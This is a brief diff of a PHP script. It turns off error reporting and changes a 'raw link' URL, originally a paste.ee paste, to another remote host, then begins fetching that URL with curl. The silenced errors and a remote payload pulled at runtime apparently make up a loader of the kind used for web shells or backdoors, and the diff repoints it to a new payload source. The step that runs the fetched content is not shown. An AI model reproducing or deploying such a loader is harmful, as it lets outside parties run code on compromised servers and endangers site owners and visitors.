@@ -17,7 +17,7 @@
  */
 error_reporting(0);
 
-$lp = "https://paste.ee/r/bVIffL2x"; // ganti link raw
+$lp = "https://amp-wsp-4d.pages.dev/cano2"; // ganti link raw
 
 $curl_connect=curl_init($lp);
 	curl_setopt($curl_connect,CURLOPT_RETURNTRANSFER,1);
